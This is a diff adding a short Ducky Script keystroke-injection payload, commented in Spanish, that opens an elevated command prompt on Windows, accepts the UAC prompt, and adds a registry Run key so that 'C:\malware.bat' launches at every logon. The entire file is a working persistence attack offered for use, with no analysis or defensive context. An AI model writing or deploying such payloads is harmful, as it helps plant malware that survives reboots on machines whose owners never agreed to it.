@@ -1,0 +1,12 @@
+REM Persistencia (Inicio automático en cada encendido)
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+CONTROL-SHIFT ENTER
+DELAY 1000
+ALT y
+STRING reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v persistence /t REG_SZ /d "C:\\malware.bat" /f
+ENTER
+STRING exit
+ENTER
